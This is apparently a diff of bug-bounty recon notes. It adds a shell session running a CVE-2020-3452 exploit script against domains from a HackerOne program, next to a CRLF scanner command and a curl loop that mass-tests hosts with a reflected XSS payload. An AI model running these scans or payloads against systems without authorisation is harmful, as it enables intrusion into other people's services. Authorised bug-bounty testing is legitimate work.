@@ -53,6 +53,14 @@ python3 ~/tools/mass-bounty/CRLF-Injection-Scanner/crlf_scan.py -i uniq.txt
 
 
 * CVE-2020-3452
+```bash
+┌──(root㉿0xlegendkiller)-[~/cves/CVE-2020-3452]
+└─# pwd
+/root/cves/CVE-2020-3452
+                                                                                              
+┌──(root㉿0xlegendkiller)-[~/cves/CVE-2020-3452]
+└─# python3 CVE-2020-3452.py -i ~/private_hackerone/playtika/domains
+```
 
 ```bash 
 cat uniq.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
